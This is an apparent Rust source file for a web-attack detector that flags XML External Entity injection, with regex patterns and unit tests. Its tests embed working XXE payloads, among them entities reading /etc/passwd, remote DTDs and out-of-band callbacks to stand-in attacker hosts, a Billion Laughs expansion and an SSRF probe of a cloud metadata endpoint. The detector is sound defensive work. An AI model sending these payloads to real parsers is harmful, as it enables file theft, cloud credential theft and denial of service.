//! XXE Evaluator — XML External Entity Injection Detection

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::types::InvariantClass;
use regex::Regex;

pub struct XxeEvaluator;

impl L2Evaluator for XxeEvaluator {
    fn id(&self) -> &'static str {
        "xxe"
    }
    fn prefix(&self) -> &'static str {
        "L2 XXE"
    }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();
        let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;

        // DOCTYPE with ENTITY declaration
        static doctype_entity: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)<!DOCTYPE\s+\w+\s*\[\s*<!ENTITY").unwrap()
        });
        if let Some(m) = doctype_entity.find(&decoded) {
            let mut confidence: f64 = 0.88;

            // Check for SYSTEM/PUBLIC (external entity)
            static SYSTEM_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r#"(?i)SYSTEM\s+['"]"#).unwrap());
            if SYSTEM_RE.is_match(&decoded) {
                confidence = 0.95;
            }
            static PUBLIC_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r#"(?i)PUBLIC\s+['"]"#).unwrap());
            if PUBLIC_RE.is_match(&decoded) {
                confidence = 0.93;
            }

            // Sensitive file targets boost
            static SENSITIVE_TARGET_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| {
                    Regex::new(r"(?i)/etc/passwd|file://|expect://|php://").unwrap()
                });
            if SENSITIVE_TARGET_RE.is_match(&decoded) {
                confidence = confidence.max(0.95);
            }

            dets.push(L2Detection {
                detection_type: "xxe_entity".into(),
                confidence,
                detail: "XML DOCTYPE with ENTITY declaration — external entity injection".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 100)]
                        .to_owned(),
                    interpretation:
                        "DOCTYPE defines external entity that can read local files or make requests"
                            .into(),
                    offset: m.start(),
                    property: "XML input must not define external entities".into(),
                }],
            });
        }

        // Parameter entity injection: %xxe;
        static param_entity: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)<!ENTITY\s+%\s+\w+\s+(?:SYSTEM|PUBLIC)").unwrap()
        });
        if let Some(m) = param_entity.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_parameter_entity".into(),
                confidence: 0.92,
                detail: "XML parameter entity with SYSTEM/PUBLIC — out-of-band XXE".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Parameter entity enables out-of-band data exfiltration".into(),
                    offset: m.start(),
                    property:
                        "XML input must not define parameter entities with external references"
                            .into(),
                }],
            });
        }

        // Parameter entity abuse: declaration + expansion
        static PARAM_ENTITY_DECL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)<!ENTITY\s+%\s*[A-Za-z0-9._-]+\s+(?:SYSTEM|PUBLIC)").unwrap()
        });
        static PARAM_ENTITY_USE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"%[A-Za-z0-9._-]+;").unwrap());
        if PARAM_ENTITY_DECL_RE.is_match(&decoded) && PARAM_ENTITY_USE_RE.is_match(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_parameter_entity_abuse".into(),
                confidence: 0.95,
                detail: "Parameter entity declaration and expansion detected".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[..decoded.len().min(140)].to_owned(),
                    interpretation: "Parser may execute parameter entities from attacker-controlled DOCTYPE body".into(),
                    offset: 0,
                    property: "Disable parameter entities for untrusted XML sources".into(),
                }],
            });
        }

        // XInclude
        static xinclude: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)<xi:include\s").unwrap());
        if let Some(m) = xinclude.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_xinclude".into(),
                confidence: 0.88,
                detail: "XInclude directive — server-side file inclusion via XML".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "XInclude includes external content during XML processing"
                        .into(),
                    offset: m.start(),
                    property: "XML input must not use XInclude directives".into(),
                }],
            });
        }
        static xinclude_href: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)<xi:include\b[^>]*\bhref\s*=\s*["'](?:[^"'\\]|\\.)*["'][^>]*\/?>"#)
                .unwrap()
        });
        if let Some(m) = xinclude_href.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_xinclude_href".into(),
                confidence: 0.95,
                detail: "XInclude with href attribute can load external resources".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "href on xi:include requests remote/local file include".into(),
                    offset: m.start(),
                    property: "Disable XInclude processing for untrusted XML documents".into(),
                }],
            });
        }

        // Default entity resolution without explicit DOCTYPE wrapper (DTD-less style parser behavior)
        static DTDLESS_ENTITY_DECL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r#"(?is)<!ENTITY\s+[A-Za-z0-9._-]+\s+SYSTEM\s+['"](?:file:///|https?://|ftp://)[^'"]+['"]"#).unwrap()
            },
        );
        static DTDLESS_ENTITY_USE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)&[A-Za-z0-9._-]+;").unwrap());
        if DTDLESS_ENTITY_DECL_RE.is_match(&decoded) && DTDLESS_ENTITY_USE_RE.is_match(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_dtdless_default_entity".into(),
                confidence: 0.93,
                detail: "External entity reference appears without DOCTYPE context".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[..decoded.len().min(160)].to_owned(),
                    interpretation: "Entity declaration and usage may trigger external resolution even when parser assumes DTD-less input".into(),
                    offset: 0,
                    property: "XML parser must disable all external entity resolution channels".into(),
                }],
            });
        }

        // Billion Laughs: recursive/stacked entity expansion patterns
        static BILLION_LAUGHS_SEED_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(r#"(?is)<!ENTITY\s+lol\s+['"][^'"]+['"]"#).unwrap()
            });
        static BILLION_LAUGHS_RECURSIVE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(r#"(?is)<!ENTITY\s+lol\d+\s+['"](?:&lol\d*;){2,}['"]"#).unwrap()
            });
        let billion_laughs_seed = BILLION_LAUGHS_SEED_RE.is_match(&decoded);
        let billion_laughs_recursive = BILLION_LAUGHS_RECURSIVE_RE.is_match(&decoded);
        if billion_laughs_seed && billion_laughs_recursive {
            dets.push(L2Detection {
                detection_type: "xxe_billion_laughs".into(),
                confidence: 0.96,
                detail: "Recursive entity expansion pattern (Billion Laughs DoS)".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: decoded[..decoded.len().min(120)].to_owned(),
                    interpretation: "Nested entity references indicate exponential XML entity expansion".into(),
                    offset: 0,
                    property: "XML parsers must disable DTD/entity expansion or enforce strict expansion limits".into(),
                }],
            });
        }

        // Blind XXE via out-of-band callback channels
        static BLIND_OOB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)<!ENTITY\s+\w+\s+SYSTEM\s+['"](?:https?|ftp)://[^'"]+['"]"#).unwrap()
        });
        let blind_oob = &*BLIND_OOB_RE;
        if let Some(m) = blind_oob.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_blind_oob".into(),
                confidence: 0.94,
                detail: "External entity callback over HTTP/FTP (blind XXE)".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "SYSTEM entity points to attacker-controlled network endpoint".into(),
                    offset: m.start(),
                    property: "XML processors must block outbound entity resolution and external DTD fetching".into(),
                }],
            });
        }

        // SVG XXE: XML prolog + ENTITY declaration in SVG content
        static svg_xxe: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)<\?xml[^>]*>[\s\S]*<!ENTITY[\s\S]*<svg\b").unwrap()
        });
        if let Some(m) = svg_xxe.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_svg_entity".into(),
                confidence: 0.91,
                detail: "SVG content contains XML prolog with ENTITY declaration".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 120)]
                        .to_owned(),
                    interpretation: "SVG XML payload embeds entity declarations for XXE execution"
                        .into(),
                    offset: m.start(),
                    property:
                        "SVG/XML uploads must strip DOCTYPE/ENTITY declarations before parsing"
                            .into(),
                }],
            });
        }

        // XSLT injection primitives that can trigger dangerous transformations
        static XSLT_VALUE_OF_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?is)<xsl:value-of\b").unwrap());
        static XSLT_TEMPLATE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?is)<xsl:template\b").unwrap());
        let xslt_value_of = XSLT_VALUE_OF_RE.is_match(&decoded);
        let xslt_template = XSLT_TEMPLATE_RE.is_match(&decoded);
        if xslt_value_of && xslt_template {
            dets.push(L2Detection {
                detection_type: "xxe_xslt_injection".into(),
                confidence: 0.87,
                detail: "XSLT template/value-of directives detected in XML payload".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: decoded[..decoded.len().min(120)].to_owned(),
                    interpretation: "Untrusted XSLT directives can pivot XML parsing into code/data exfiltration paths".into(),
                    offset: 0,
                    property: "XSLT processing must be disabled or sandboxed for untrusted XML".into(),
                }],
            });
        }

        // SOAP XXE: DTD declaration embedded in SOAP envelope/body
        static soap_xxe: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)<(?:\w+:)?Envelope\b[\s\S]*<!DOCTYPE[\s\S]*<(?:\w+:)?Body\b").unwrap()
        });
        if let Some(m) = soap_xxe.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_soap_dtd".into(),
                confidence: 0.93,
                detail: "SOAP envelope includes inline DTD declaration".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 120)]
                        .to_owned(),
                    interpretation:
                        "SOAP XML embeds DTD in processing context where XXE is often exploitable"
                            .into(),
                    offset: m.start(),
                    property: "SOAP parsers must reject DTDs and external entities".into(),
                }],
            });
        }

        // XML schema relay channels (SOAP + generic XML schemaLocation) can trigger DTD-less XXE resolution
        static soap_schema_relay: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)xsi:(?:noNamespaceSchemaLocation|schemaLocation)\s*=\s*["'][^"']*(?:file:///|https?://|ftp://)[^"']*["']"#).unwrap()
        });
        if soap_schema_relay.is_match(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_soap_schema_relay".into(),
                confidence: 0.89,
                detail: "SOAP envelope includes external schemaLocation that may enable DTD-less XXE".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: decoded[..decoded.len().min(180)].to_owned(),
                    interpretation: "SchemaLocation allows remote schema/entity resolution in SOAP XML workflows".into(),
                    offset: 0,
                    property: "SOAP processors must disable schema and external entity retrieval for untrusted payloads".into(),
                }],
            });
        }

        // Error-based XXE probing via nonexistent local file resolution
        static ERROR_BASED_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)SYSTEM\s+['"]file:///nonexistent[^'"]*['"]"#).unwrap()
        });
        let error_based = &*ERROR_BASED_RE;
        if let Some(m) = error_based.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_error_based".into(),
                confidence: 0.90,
                detail: "Error-based XXE probe using nonexistent local file".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Payload intentionally triggers parser file access errors to leak server internals".into(),
                    offset: m.start(),
                    property: "XML parser errors must not disclose file paths or parser context from entity resolution".into(),
                }],
            });
        }

        // XXE via PUBLIC identifier (PUBLIC + SYSTEM identifiers)
        static PUBLIC_ENTITY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)<!ENTITY\s+\w+\s+PUBLIC\s+[\x27\x22][^'"]+[\x27\x22]\s+[\x27\x22][^'"]+[\x27\x22]"#,
            )
            .unwrap()
        });
        if let Some(m) = PUBLIC_ENTITY_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_public_entity".into(),
                confidence: 0.93,
                detail: "PUBLIC entity declaration references an external identifier".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "PUBLIC entity declarations reference external DTD resources via a public identifier + system identifier. This bypasses SYSTEM-only filters and triggers OOB data exfiltration via external URL resolution".into(),
                    offset: m.start(),
                    property: "XML parsers must disable ALL external entity resolution including PUBLIC identifier entities".into(),
                }],
            });
        }

        // XXE SSRF to cloud metadata services
        static XXE_SSRF_METADATA_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)SYSTEM\s+[\x27\x22](?:https?://)?(?:169\.254\.169\.254|metadata\.google\.internal|169\.254\.170\.2|fd00:ec2::254|100\.100\.100\.200)").unwrap()
        });
        if let Some(m) = XXE_SSRF_METADATA_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_ssrf_metadata".into(),
                confidence: 0.94,
                detail: "SYSTEM entity targets cloud metadata endpoint".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "XXE SYSTEM entity pointing to cloud instance metadata endpoints (169.254.169.254 = AWS/GCP/Azure) performs SSRF to steal cloud credentials, IAM roles, and instance configuration".into(),
                    offset: m.start(),
                    property: "XML SYSTEM entities must not resolve to link-local addresses (169.254.0.0/16) or known cloud metadata endpoints".into(),
                }],
            });
        }

        // XOP include resolution
        static XOP_INCLUDE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)<(?:\w+:)?Include\b[^>]*\bhref\s*=\s*[\x27\x22]?(?:file://|https?://|ftp://|gopher://)").unwrap()
        });
        if let Some(m) = XOP_INCLUDE_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_xop_include".into(),
                confidence: 0.91,
                detail: "XOP Include href may load external resources".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "XOP (XML-Binary Optimized Packaging) Include directives with file:// or http:// hrefs cause XML parsers to fetch and embed external content, enabling both XXE file disclosure and SSRF in SOAP/MTOM processing contexts".into(),
                    offset: m.start(),
                    property: "XOP Include href attributes must not reference file:// or arbitrary external URLs. Only trusted content-id references should be permitted".into(),
                }],
            });
        }

        // Parameter entity nested DTD OOB exfiltration chain
        static NESTED_DTD_OOB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)<!ENTITY\s+%\s+\w+\s+SYSTEM\s+[\x27\x22][^'"]+[\x27\x22][^<]*>[^<]*%\w+;"#,
            )
            .unwrap()
        });
        if let Some(m) = NESTED_DTD_OOB_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_nested_dtd_oob".into(),
                confidence: 0.95,
                detail: "Nested parameter entity DTD chain for OOB exfiltration".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Nested parameter entity OOB exfiltration: attacker loads a remote DTD that defines a new entity containing the stolen file data, then triggers a DNS/HTTP request to attacker infrastructure encoding the exfiltrated content".into(),
                    offset: m.start(),
                    property: "Parameter entities must be fully disabled. External DTD loading via %entity; SYSTEM references must be blocked at the parser level".into(),
                }],
            });
        }

        // xml-stylesheet processing instruction external stylesheet loading
        static XSLT_PI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)<\?xml-stylesheet[^?>]*href\s*=\s*[\x27\x22]?(?:file://|https?://|//[^/])").unwrap()
        });
        if let Some(m) = XSLT_PI_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xxe_xslt_pi".into(),
                confidence: 0.88,
                detail: "xml-stylesheet PI references external stylesheet URL".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "xml-stylesheet processing instructions can trigger external XSLT stylesheet loading and execution. Malicious XSLT can read files, perform SSRF, and execute XPath/XSLT injection attacks".into(),
                    offset: m.start(),
                    property: "xml-stylesheet processing instructions must not reference external URLs. XSLT processing must be disabled when handling untrusted XML".into(),
                }],
            });
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "xxe_entity" | "xxe_parameter_entity" | "xxe_xinclude" => {
                Some(InvariantClass::XxeEntityExpansion)
            }
            "xxe_billion_laughs"
            | "xxe_blind_oob"
            | "xxe_svg_entity"
            | "xxe_soap_dtd"
            | "xxe_error_based"
            | "xxe_dtdless_default_entity"
            | "xxe_soap_schema_relay"
            | "xxe_xinclude_href"
            | "xxe_parameter_entity_abuse"
            | "xxe_public_entity"
            | "xxe_ssrf_metadata"
            | "xxe_xop_include"
            | "xxe_nested_dtd_oob"
            | "xxe_xslt_pi" => Some(InvariantClass::XxeEntityExpansion),
            "xxe_xslt_injection" => Some(InvariantClass::XmlInjection),
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_billion_laughs_pattern() {
        let eval = XxeEvaluator;
        let input = r#"<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;">
]>
<root>&lol2;</root>"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_billion_laughs")
        );
    }

    #[test]
    fn detects_blind_xxe_oob_callback() {
        let eval = XxeEvaluator;
        let input = r#"<!DOCTYPE a [<!ENTITY xxe SYSTEM "http://attacker.tld/oob">]><a>&xxe;</a>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_blind_oob"));
    }

    #[test]
    fn detects_svg_xxe_entity_declaration() {
        let eval = XxeEvaluator;
        let input = r#"<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_svg_entity"));
    }

    #[test]
    fn detects_xslt_injection_markers() {
        let eval = XxeEvaluator;
        let input = r#"<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/"><xsl:value-of select="system-property('x')"/></xsl:template>
</xsl:stylesheet>"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_xslt_injection")
        );
    }

    #[test]
    fn detects_parameter_entity_abuse_declaration_usage_pairing() {
        let eval = XxeEvaluator;
        let input = r#"<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.tld/xxe.dtd">
%xxe;
]>
<root>&xxe;</root>"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_parameter_entity_abuse")
        );
    }

    #[test]
    fn detects_xinclude_href_file_load() {
        let eval = XxeEvaluator;
        let input = r#"<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text" />
</root>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_xinclude_href"));
    }

    #[test]
    fn detects_dtdless_default_entity_reference() {
        let eval = XxeEvaluator;
        let input = r#"<!ENTITY ext SYSTEM "file:///etc/passwd">&ext;"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_dtdless_default_entity")
        );
    }

    #[test]
    fn detects_soap_schema_relay_xxe() {
        let eval = XxeEvaluator;
        let input = r#"<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xi="http://www.w3.org/2001/XInclude"
    xsi:noNamespaceSchemaLocation="http://attacker.tld/schema.xsd"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Header/>
  <soapenv:Body><m:Action>status</m:Action></soapenv:Body>
</soapenv:Envelope>"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_soap_schema_relay")
        );
    }

    #[test]
    fn detects_xinclude_oob_target_file() {
        let eval = XxeEvaluator;
        let input = r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://attacker.tld/payload.xml"/>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_xinclude_href"));
    }

    #[test]
    fn detects_xml_schema_location_default_entity() {
        let eval = XxeEvaluator;
        let input = r#"<note xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://schemas.example.org/note http://attacker.tld/note.xsd"
xsi:noNamespaceSchemaLocation="http://attacker.tld/note.xsd">hello</note>"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "xxe_soap_schema_relay")
        );
    }

    #[test]
    fn detects_soap_xxe_dtd() {
        let eval = XxeEvaluator;
        let input = r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body><m:GetData>&xxe;</m:GetData></soap:Body></soap:Envelope>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_soap_dtd"));
    }

    #[test]
    fn detects_error_based_xxe_nonexistent_file_probe() {
        let eval = XxeEvaluator;
        let input =
            r#"<!DOCTYPE x [<!ENTITY err SYSTEM "file:///nonexistent-path-xxe">]><x>&err;</x>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_error_based"));
    }

    #[test]
    fn test_xxe_public_entity() {
        let eval = XxeEvaluator;
        let input = r#"<!ENTITY xxe PUBLIC "x" "http://attacker.com/evil">"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_public_entity"));
    }

    #[test]
    fn test_xxe_ssrf_metadata() {
        let eval = XxeEvaluator;
        let input = r#"SYSTEM "http://169.254.169.254/latest/meta-data/""#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_ssrf_metadata"));
    }

    #[test]
    fn test_xxe_xop_include() {
        let eval = XxeEvaluator;
        let input = r#"<xop:Include href="file:///etc/passwd"/>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_xop_include"));
    }

    #[test]
    fn test_xxe_nested_dtd() {
        let eval = XxeEvaluator;
        let input = r#"<!ENTITY % dtd SYSTEM "http://attacker.com/dtd"> %dtd; %send;"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_nested_dtd_oob"));
    }

    #[test]
    fn test_xxe_xslt_pi() {
        let eval = XxeEvaluator;
        let input = r#"<?xml-stylesheet href="http://attacker.com/evil.xsl" type="text/xsl"?>"#;
        let dets = eval.detect(input);
        assert!(dets.iter().any(|d| d.detection_type == "xxe_xslt_pi"));
    }
}
